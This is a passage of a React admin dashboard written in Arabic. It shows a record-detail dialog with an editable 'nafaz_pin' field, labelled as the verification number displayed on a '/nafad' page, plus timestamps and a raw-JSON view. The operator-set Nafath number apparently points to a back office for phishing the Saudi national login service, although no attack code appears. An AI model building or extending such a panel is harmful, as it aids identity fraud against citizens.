                        placeholder="مثال: 42"
                        onUpdate={handleUpdate}
                      />
                    </div>

                    {/* nafaz_pin — nafaz page verification code */}
                    <div>
                      <p className="text-xs font-semibold text-gray-600 mb-1">رمز نفاذ PIN (nafaz_pin)</p>
                      <p className="text-[11px] text-gray-400 mb-2">يظهر في صفحة /nafad كرقم التحقق</p>
                      <TextFieldControl
                        key={"pin-" + selectedRecord.id + "-" + str(selectedRecord.nafaz_pin)}
                        record={selectedRecord}
                        field="nafaz_pin"
                        placeholder="مثال: 58"
                        onUpdate={handleUpdate}
                      />
                    </div>
                  </div>
                </section>

                {/* Timestamps */}
                <section>
                  <h3 className="text-sm font-bold text-gray-900 mb-3 flex items-center gap-2">
                    <Clock className="h-4 w-4 text-teal-700" />
                    التوقيتات
                  </h3>
                  <div className="bg-gray-50 rounded-xl p-4">
                    <DetailRow icon={Clock} label="تاريخ الإنشاء" value={formatDate(str(selectedRecord.createdAt) || str(selectedRecord.createdDate))} />
                    <DetailRow icon={Clock} label="آخر تحديث" value={formatDate(str(selectedRecord.updatedAt))} />
                    <DetailRow icon={Clock} label="تاريخ الإكمال" value={formatDate(str(selectedRecord.completedDate))} />
                  </div>
                </section>

                {/* Raw JSON */}
                <section>
                  <details className="group">
                    <summary className="text-xs font-semibold text-gray-500 cursor-pointer hover:text-gray-700 flex items-center gap-1">
                      <ChevronLeft className="h-3.5 w-3.5 transition-transform group-open:rotate-[-90deg]" />
                      عرض البيانات الخام (JSON)
                    </summary>
                    <pre className="mt-3 bg-gray-900 text-green-400 p-4 rounded-xl text-xs overflow-x-auto max-h-64 leading-relaxed" dir="ltr">
                      {JSON.stringify(selectedRecord, null, 2)}
                    </pre>
                  </details>
                </section>
              </div>
            </>
          )}
        </DialogContent>
      </Dialog>
    </div>
  )
}
